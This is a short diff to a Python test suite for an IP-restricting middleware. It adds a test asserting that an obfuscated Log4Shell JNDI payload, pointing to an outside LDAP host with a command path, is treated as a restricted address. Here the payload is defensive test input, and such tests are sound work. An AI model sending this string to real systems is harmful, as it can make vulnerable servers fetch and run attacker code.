@@ -37,6 +37,10 @@ class MiddlewareRestrictsTest(TestCase):
         self.assert_ip_is_restricted("192.168.1.1")
         self.assert_ip_is_restricted("10.10.10.1")
         self.assert_ip_is_restricted("169.254.0.1")
+        self.assert_ip_is_restricted(
+            "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}"
+            "//2.13.12.12/TomcatBypass/Command/Base64/HeHeHe=}')"
+        )
 
     def test_middleware_allows_localhost(self):
         response = self.client.get("/some/url", REMOTE_ADDR="127.0.0.1")
